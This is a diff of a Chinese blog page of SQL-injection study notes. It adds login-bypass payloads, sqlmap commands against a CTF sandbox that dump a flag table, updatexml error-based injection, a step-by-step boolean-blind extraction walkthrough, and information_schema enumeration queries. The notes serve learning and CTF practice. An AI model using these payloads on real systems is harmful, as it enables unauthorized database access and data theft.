@@ -79,28 +79,18 @@
 <blockquote>
 <p><strong>常用的万能username语句：</strong></p>
 <ul>
-<li><p><code>a ’ or 1=1 #</code></p>
-</li>
-<li><p><code>a &quot;) or 1=1 #</code></p>
-</li>
-<li><p><code>a‘) or 1=1 #*</code></p>
-</li>
-<li><p><code>a” or “1”=”1</code></p>
-</li>
-<li><p><code>&#39; or &#39;1&#39;=&#39;1</code></p>
-</li>
-<li><p><code>&#39; or (length(database())) = 8  (用于输入’ “都没有错误)</code></p>
-</li>
-<li><p><code>&#39; or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)</code></p>
-</li>
-<li><p><code>&quot;) or (&quot;1&quot;)=(&quot;1</code></p>
-</li>
-<li><p><code>&quot;) or 1=1 or if(1=1, sleep(1), null)  #</code></p>
-</li>
-<li><p><code>&quot;) or (length(database())) = 8 #</code></p>
-</li>
-<li><p><code>&quot;) or (ascii(substr((select database()) ,1,1))) = 115  or if(1=1, sleep(1), null)  #</code></p>
-</li>
+<li><code>a ’ or 1=1 #</code></li>
+<li><code>a &quot;) or 1=1 #</code></li>
+<li><code>a‘) or 1=1 #*</code></li>
+<li><code>a” or “1”=”1</code></li>
+<li><code>&#39; or &#39;1&#39;=&#39;1</code></li>
+<li><code>&#39; or (length(database())) = 8  (用于输入’ “都没有错误)</code></li>
+<li><code>&#39; or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)</code></li>
+<li><code>&quot;) or (&quot;1&quot;)=(&quot;1</code></li>
+<li><code>&quot;) or 1=1 or if(1=1, sleep(1), null)  #</code></li>
+<li><code>&quot;) or (length(database())) = 8 #</code></li>
+<li><code>&quot;) or (ascii(substr((select database()) ,1,1))) = 115  or if(1=1, sleep(1), null)  #</code></li>
+<li><code>**当注释符被过滤时，可以采用  or&#39; 来替代注释符的作用</code></li>
 </ul>
 </blockquote>
 <h2 id="3-INSERT语句"><a href="#3-INSERT语句" class="headerlink" title="3.INSERT语句"></a>3.INSERT语句</h2><blockquote>
@@ -137,6 +127,11 @@
 <p><strong><code>&#39; union select flag from table1%23</code></strong></p>
 <p><strong>这是一个基本的注入过程</strong></p>
 </blockquote>
+<p>sqlmap整数型注入（ctfhub技能树sql第一题）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http:&#x2F;&#x2F;challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;1 --dbs &#x2F;&#x2F;爆库，得到sqli</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;1 -D sqli --tables &#x2F;&#x2F;爆表</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;1 -D sqli -T flag --columns &#x2F;&#x2F;爆字段</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;1 -D sqli -T flag -C flag --dump&#x2F;&#x2F;显示内容</span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="7、报错注入"><a href="#7、报错注入" class="headerlink" title="7、报错注入"></a>7、报错注入</h2><blockquote>
 <p><strong>十种常见注入</strong></p>
 <p><strong>1.floor()</strong></p>
@@ -148,7 +143,9 @@
 </blockquote>
 <blockquote>
 <p><strong>3、updatexml()</strong></p>
-<p><strong><code>select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</code></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串，带尖括号) ，如果不了解Xpath语法，可以在网上查找教程。 </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br><span class="line"></span><br><span class="line">由于updatexml的第二个参数需要Xpath格式的字符串，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</span><br></pre></td></tr></table></figure>
+
+<p><code>select * from test where id=1 and (updatexml(1,concat(‘~’,(select user()),‘~’),1));</code></p>
 <p><img src="https://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205719485-521701933.png" alt=""></p>
 </blockquote>
 <blockquote>
@@ -170,6 +167,11 @@
 <p><strong>若查询结果不为空，返回True，否则返回False</strong></p>
 <p><strong>例如<code>&#39; and length(database())=8</code></strong></p>
 </blockquote>
+<p>代码块内内容转载于<a href="https://blog.csdn.net/sinat_41380394/article/details/81544700" target="_blank" rel="noopener">https://blog.csdn.net/sinat_41380394/article/details/81544700</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">猜数据库名   </span><br><span class="line"></span><br><span class="line">  方法一：（可以通过burpsuite拦截数据包，更改ascii值重发获取）</span><br><span class="line">     1&#39; and length(database())&#x3D;4 #数据库名长度是4</span><br><span class="line">     1&#39; and ascii(substr(database(),1,1))&#x3D;119#   w</span><br><span class="line">     1&#39; and ascii(substr(database(),2,1))&#x3D;101#   e</span><br><span class="line">     1&#39; and ascii(substr(database(),3,1))&#x3D;98#   b</span><br><span class="line">     1&#39; and ascii(substr(database(),4,1))&#x3D;49#   1</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">   方法二：另类猜数据库名方法，写一个查找失败的函数</span><br><span class="line">     1&#39; and (select count(*) from aaa) &gt; 0 #</span><br><span class="line">     Table &#39;web1.aaa&#39; doesn&#39;t exist，存在错误回显，显示数据库名为web1</span><br><span class="line"></span><br><span class="line">猜测表的个数 2个表</span><br><span class="line">   1&#39; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;2#</span><br><span class="line"></span><br><span class="line">猜表名</span><br><span class="line">   第一个表名：flag</span><br><span class="line">   1&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&#x3D;4#   第一个表名长度为4</span><br><span class="line">   1&#39; and ascii(substr((select table_name from  information_schema.tables where table_schema&#x3D;database() limit  0,1),1,1))&#x3D;102#    f</span><br><span class="line">   1&#39; and ascii(substr((select table_name from  information_schema.tables where table_schema&#x3D;database() limit  0,1),2,1))&#x3D;108#   l</span><br><span class="line">   1&#39; and ascii(substr((select table_name from  information_schema.tables where table_schema&#x3D;database() limit  0,1),3,1))&#x3D;97#   a</span><br><span class="line">   1&#39; and ascii(substr((select table_name from  information_schema.tables where table_schema&#x3D;database() limit  0,1),4,1))&#x3D;103#   g</span><br><span class="line">   </span><br><span class="line">   第二个表名：web_1</span><br><span class="line">   1&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1))&#x3D;5#   第二个表名长度为5</span><br><span class="line">   1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1,1))&#x3D;119# w</span><br><span class="line">   1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),2,1))&#x3D;101# e</span><br><span class="line">   1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),3,1))&#x3D;98# w</span><br><span class="line">   1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),4,1))&#x3D;95# _</span><br><span class="line">   1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),5,1))&#x3D;49# 1</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">猜列名</span><br><span class="line">   第一个表列名长度</span><br><span class="line">   1&#39; and length((select column_name from information_schema.columns  where table_schema&#x3D;database() and table_name&#x3D;&#39;flag&#39; limit 1))&#x3D;4#    列名长度4</span><br><span class="line">   1&#39; and ascii(substr((select column_name from  information_schema.columns where table_schema&#x3D;database() and  table_name&#x3D;&#39;flag&#39; limit 1),1,1))&#x3D;102# f</span><br><span class="line">   1&#39; and ascii(substr((select column_name from  information_schema.columns where table_schema&#x3D;database() and  table_name&#x3D;&#39;flag&#39; limit 1),2,1))&#x3D;108# l</span><br><span class="line">   1&#39; and ascii(substr((select column_name from  information_schema.columns where table_schema&#x3D;database() and  table_name&#x3D;&#39;flag&#39; limit 1),3,1))&#x3D;97# a</span><br><span class="line">   1&#39; and ascii(substr((select column_name from  information_schema.columns where table_schema&#x3D;database() and  table_name&#x3D;&#39;flag&#39; limit 1),4,1))&#x3D;103# g</span><br><span class="line"></span><br><span class="line">猜数据</span><br><span class="line">   1&#39; and (select count(*) from flag)&#x3D;1 #   有一行数据</span><br><span class="line">   1&#39; and length((select flag from flag limit 1))&#x3D; 26 #   数据长度26</span><br><span class="line">   1&#39; and ascii(substr((select flag from flag limit 1),1,1)) &#x3D; 102 #   第一个字符为f，放到burpsuite中跑，可以得到结果</span><br></pre></td></tr></table></figure>
+
+
+
 <blockquote>
 <p><strong>2、Orderby盲注</strong></p>
 <p><strong><code>&#39; order by rand(database=&#39;happy&#39;)</code></strong></p>
@@ -215,6 +217,102 @@
 <p><code>STRICT_TRANS_TABLES：</code><br><strong>在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制。必须设置，以后各项可能依赖于该项的设置</strong><br><code>NO_ENGINE_SUBSTITUTION：</code><br><strong>如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常</strong><br><code>ONLY_FULL_GROUP_BY：</code><br><strong>对于GROUP BY操作，如果在SELECT中出现的单独的列，没有在GROUP BY子句中出现，那么这个SQL是不合法的</strong><br><code>NO_AUTO_VALUE_ON_ZERO：</code><br><strong>该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了</strong><br><code>NO_ZERO_IN_DATE：</code><br><strong>在严格模式下，不允许日期和月份为零</strong><br><code>NO_ZERO_DATE：</code><br><strong>设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告</strong><br><code>ERROR_FOR_DIVISION_BY_ZERO：</code><br><strong>在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL</strong><br><code>NO_AUTO_CREATE_USER：</code><br><strong>禁止GRANT语句创建密码为空的用户</strong><br><code>PIPES_AS_CONCAT：</code><br><strong>将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</strong><br><code>ANSI_QUOTES：</code><br><strong>启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</strong><br><strong>也可以在命令行查看和设置sql_mode变量</strong><br><strong>查看全局的以及当前会话的sql_mode设置</strong><br><code>SELECT @@global.sql_mode,@@session.sql_mode;</code><br><strong>设置全局的以及当前会话的sql_mode设置：</strong><br><code>SET @@global.sql_mode=‘STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION,no_zero_date,no_zero_in_date,PIPES_AS_CONCAT’;</code><br><code>SET @@sql_mode=‘STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION,no_zero_date,no_zero_in_date,PIPES_AS_CONCAT’;</code><br><strong>全局设置影响从那时起新连接的所有客户端，设置SESSION变量只影响当前的客户端</strong></p>
 <p><strong>全局和会话的概念:</strong><br> <strong>全局就是影响整个数据库<br> 会话就是影响当前连接的会话,如果会话终止,设置的参数值失效.</strong><br> <strong>静态参数和动态参数:</strong><br> <strong>静态参数:只有数据库进行重启才会生效(数据库安装时就要确定好)<br> 动态参数:在数据库运行过程中可以随时修改</strong></p>
 </blockquote>
+<h2 id="13、函数"><a href="#13、函数" class="headerlink" title="13、函数"></a>13、函数</h2><blockquote>
+<hr>
+</blockquote>
+<blockquote>
+<h3 id="1、group-by"><a href="#1、group-by" class="headerlink" title="1、group by"></a>1、group by</h3><p><strong>根据“By”指定的规则对数据进行分组。将一个“数据集”划分成若干个“小区域”，然后针对若干个“小区域”进行数据处理。</strong></p>
+</blockquote>
+<p><strong>例如，现有一张表A,有三个字段，但是类别字段下有重名的id，要把类别相同的归为一组</strong></p>
+<p><img src="https://s1.ax1x.com/2020/08/03/aUpr2q.png" alt=""></p>
+<p><strong><code>select   类别,    sum(数量) as 数量之和    from A    group by  类别</code></strong></p>
+<p><strong>结果为：</strong></p>
+<p><img src="https://s1.ax1x.com/2020/08/03/aUpsx0.png" alt=""></p>
+<p><strong>group by语句中select指定的字段必须是“分组依据字段”，其他字段若想出现在select中则必须包含在聚合函数中，常见的聚合函数如下：</strong></p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+<th>支持性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>sum(列名)</td>
+<td>求和</td>
+<td></td>
+</tr>
+<tr>
+<td>max(列名)</td>
+<td>最大值</td>
+<td></td>
+</tr>
+<tr>
+<td>min(列名)</td>
+<td>最小值</td>
+<td></td>
+</tr>
+<tr>
+<td>avg(列名)</td>
+<td>平均值</td>
+<td></td>
+</tr>
+<tr>
+<td>first(列名)</td>
+<td>第一条记录</td>
+<td>仅Access支持</td>
+</tr>
+<tr>
+<td>last(列名)</td>
+<td>最后一条记录</td>
+<td>仅Access支持</td>
+</tr>
+<tr>
+<td>count(列名)</td>
+<td>统计记录数</td>
+<td>注意和count(*)的区别</td>
+</tr>
+</tbody></table>
+<h3 id="2、concat"><a href="#2、concat" class="headerlink" title="2、concat ()"></a>2、concat ()</h3><blockquote>
+<p><strong>功能：将多个字符串连接成一个字符串。</strong></p>
+<p><strong>语法：<code>concat(str1, str2,...)</code></strong></p>
+<p><strong>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</strong></p>
+<p><strong>例如：<code>select concat (类别，&#39;,&#39;，数量) as info from A; //其中，&#39;,&#39;是分隔符</code></strong></p>
+</blockquote>
+<h3 id="3、group-concat"><a href="#3、group-concat" class="headerlink" title="3、group_concat()"></a>3、group_concat()</h3><blockquote>
+<p><code>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator &#39;分隔符&#39;])</code></p>
+<p><strong>将group by分的组连接起来，例如：<code>select 类别，group_concat(数量,&#39;,&#39;) from A group by 类别</code></strong></p>
+<p><strong>结果为</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">类别</th>
+<th align="center">数量</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">a</td>
+<td align="center">5,2,11</td>
+</tr>
+<tr>
+<td align="center">b</td>
+<td align="center">10,6,3</td>
+</tr>
+<tr>
+<td align="center">c</td>
+<td align="center">9,9,8,7,4</td>
+</tr>
+</tbody></table>
+</blockquote>
+<h2 id="14、数据的结构"><a href="#14、数据的结构" class="headerlink" title="14、数据的结构"></a>14、数据的结构</h2><h3 id="1、元数据"><a href="#1、元数据" class="headerlink" title="1、元数据"></a>1、元数据</h3><p><strong>元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。<br> 有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。</strong></p>
+<h3 id="2、information-schema"><a href="#2、information-schema" class="headerlink" title="2、information_schema"></a>2、<strong>information_schema</strong></h3><p><strong>这是一个数据库，存储了元数据，提供了访问元数据的方式</strong></p>
+<p><strong>进入：<code>use information_schema</code></strong></p>
+<p><strong>在该数据库中有一个table叫schemata,描述了整个MySQL 下所有数据库。  <code>SELECT * FROM information_schema.SCHEMATA</code></strong></p>
+<p><strong>当我们得到了数据库的名字时，我们就可以对数据库中的表进行查询，例如查询geek数据库下的表内容：</strong></p>
+<p><code>SELECT group_concat(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &#39;geek&#39;</code></p>
+<p><strong>当我们知道了表的名字时，我们可以对表中字段进行查询，例如查询geekuser表下的字段：</strong></p>
+<p><code>SELECT  group_concat(column_name), DATA_TYPE FROM information_schema.COLUMNS WHERE TABLE_NAME = &#39;geekuser&#39;</code></p>
+<p><strong>所以，我们可以像这样，利用联合注入，去顺藤摸瓜，窃取数据库的数据</strong></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
@@ -250,7 +348,7 @@
     </div>
     
         <div class='side'>
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一、SQL注入"><span class="toc-number">1.</span> <span class="toc-text">一、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、原理"><span class="toc-number">1.1.</span> <span class="toc-text">1、原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、基本漏洞"><span class="toc-number">1.2.</span> <span class="toc-text">2、基本漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-INSERT语句"><span class="toc-number">1.3.</span> <span class="toc-text">3.INSERT语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4、UPDATE语句"><span class="toc-number">1.4.</span> <span class="toc-text">4、UPDATE语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5、DELETE语句"><span class="toc-number">1.5.</span> <span class="toc-text">5、DELETE语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6、联合查询"><span class="toc-number">1.6.</span> <span class="toc-text">6、联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7、报错注入"><span class="toc-number">1.7.</span> <span class="toc-text">7、报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8、布尔盲注"><span class="toc-number">1.8.</span> <span class="toc-text">8、布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9、时间盲注"><span class="toc-number">1.9.</span> <span class="toc-text">9、时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10、堆叠注入"><span class="toc-number">1.10.</span> <span class="toc-text">10、堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11、重要语句"><span class="toc-number">1.11.</span> <span class="toc-text">11、重要语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12、sql-mode"><span class="toc-number">1.12.</span> <span class="toc-text">12、sql_mode</span></a></li></ol></li></ol>	
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一、SQL注入"><span class="toc-number">1.</span> <span class="toc-text">一、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、原理"><span class="toc-number">1.1.</span> <span class="toc-text">1、原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、基本漏洞"><span class="toc-number">1.2.</span> <span class="toc-text">2、基本漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-INSERT语句"><span class="toc-number">1.3.</span> <span class="toc-text">3.INSERT语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4、UPDATE语句"><span class="toc-number">1.4.</span> <span class="toc-text">4、UPDATE语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5、DELETE语句"><span class="toc-number">1.5.</span> <span class="toc-text">5、DELETE语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6、联合查询"><span class="toc-number">1.6.</span> <span class="toc-text">6、联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7、报错注入"><span class="toc-number">1.7.</span> <span class="toc-text">7、报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8、布尔盲注"><span class="toc-number">1.8.</span> <span class="toc-text">8、布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9、时间盲注"><span class="toc-number">1.9.</span> <span class="toc-text">9、时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10、堆叠注入"><span class="toc-number">1.10.</span> <span class="toc-text">10、堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11、重要语句"><span class="toc-number">1.11.</span> <span class="toc-text">11、重要语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12、sql-mode"><span class="toc-number">1.12.</span> <span class="toc-text">12、sql_mode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13、函数"><span class="toc-number">1.13.</span> <span class="toc-text">13、函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、group-by"><span class="toc-number">1.13.1.</span> <span class="toc-text">1、group by</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、concat"><span class="toc-number">1.13.2.</span> <span class="toc-text">2、concat ()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、group-concat"><span class="toc-number">1.13.3.</span> <span class="toc-text">3、group_concat()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14、数据的结构"><span class="toc-number">1.14.</span> <span class="toc-text">14、数据的结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、元数据"><span class="toc-number">1.14.1.</span> <span class="toc-text">1、元数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、information-schema"><span class="toc-number">1.14.2.</span> <span class="toc-text">2、information_schema</span></a></li></ol></li></ol></li></ol>	
         </div>
     
 </div>
